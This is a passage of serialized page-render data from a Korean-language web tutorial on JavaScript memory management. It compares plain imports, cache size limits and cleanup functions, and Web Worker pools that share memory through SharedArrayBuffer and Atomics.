punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"removeEventListener\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'resize'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" handler\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"addEventListener\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'resize'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" handler\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"destroy\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"17\",\"children\":[\"  cleanup\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"?.\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"18\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"19\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"20\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🔴 워커 패턴이 필요한 특수 케이스 (1% 미만)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"21\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - 수백 MB 이상의 거대 라이브러리\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"22\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - 한 번만 실행되는 무거운 초기화 작업\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"23\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - 메모리 민감한 환경 (임베디드 브라우저 등)\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-실무에서의-우선순위\",\"children\":\"📊 실무에서의 우선순위\"}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"첫 번째 선택: 일반 import\"}],\" (95% 이상)\"]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"간단하고 빠름\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"대부분의 앱은 메모리 문제 없음\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"브라우저 최적화 활용\"}],\"\\n\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"두 번째 선택: 스마트한 메모리 관리\"}],\" (4%)\"]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"Map/Set 크기 제한\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"TTL 구현\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"명시적 cleanup 함수\"}],\"\\n\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"마지막 선택: 워커 패턴\"}],\" (1% 미만)\"]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"정말 큰 라이브러리 (100MB+)\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"메모리가 극도로 제한된 환경\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"복잡도를 감수할 만한 명확한 이유\"}],\"\\n\"]}],\"\\n\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-실용적-조언\",\"children\":\"🎯 실용적 조언\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ✅ 대부분의 경우 이것으로 충분\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" myFunction \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./my-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ❌ 과도한 최적화 (불필요한 복잡도)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" worker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 10KB 모듈을 위해 워커 사용? No!\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"워커 패턴은 \\\"알아두면 좋은 고급 기법\\\"이지, 기본 접근법이 아닙니다!\"}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-sharedarraybuffer를-통한-메모리-공유\",\"children\":\"💡 SharedArrayBuffer를 통한 메모리 공유\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"워커 간 중복 메모리를 줄이기 위한 전략:\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 메인 스레드\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" sharedBuffer \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"SharedArrayBuffer\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1024\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"*\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1024\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1MB\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" sharedArray \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Int32Array\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"sharedBuffer\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 여러 워커에 동일한 버퍼 전달\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"worker1\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"postMessage\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"buffer\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" sharedBuffer \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"worker2\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"postMessage\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"buffer\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" sharedBuffer \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// worker.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method-variable function-variable method function property-access\",\"children\":\"onmessage\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"e\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" sharedArray \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Int32Array\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"buffer\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모든 워커가 동일한 메모리 공간 접근\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ⚠️ 동기화 필요!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"Atomics\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"add\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"sharedArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 원자적 연산\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-실전-활용-패턴-모듈-풀pool-관리\",\"children\":\"🚀 실전 활용 패턴: 모듈 풀(Pool) 관리\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"class\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ModuleWorkerPool\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"constructor\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":[\"workerPath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" poolSize \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"4\"}]]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"workers\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"queue\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 워커 풀 생성\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"for\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\" poolSize\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"++\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" worker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"workerPath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"workers\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"push\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"busy\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"false\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"async\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"execute\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 사용 가능한 워커 찾기\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" availableWorker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"workers\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"find\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"w\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"!\"}],\"w\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"busy\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"17\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"!\"}],\"availableWorker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"18\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모든 워커가 바쁘면 대기\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"19\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Promise\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"resolve\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"20\",\"children\":[\"        \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"queue\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"push\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" resolve \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"21\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"22\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token 